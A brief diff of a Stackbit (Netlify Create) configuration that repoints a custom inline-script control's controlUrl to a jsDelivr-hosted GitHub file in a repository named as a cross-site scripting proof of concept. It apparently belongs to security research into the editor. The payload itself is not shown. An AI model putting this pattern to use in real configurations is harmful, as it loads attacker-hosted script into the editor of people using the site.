@@ -26,7 +26,7 @@ export default defineStackbitConfig({
             name: 'customControl',
             type: 'string',
             controlType: 'custom-inline-script',
-            controlUrl: 'https://create-custom-control-xss-poc-20261015.netlify.app/custom-control.js'
+            controlUrl: 'https://cdn.jsdelivr.net/gh/lmzkjmiajzj-lgtm/netlify-create-custom-control-xss-owned-poc@v1.0.0/custom-control.js'
           }
         ]
       }]
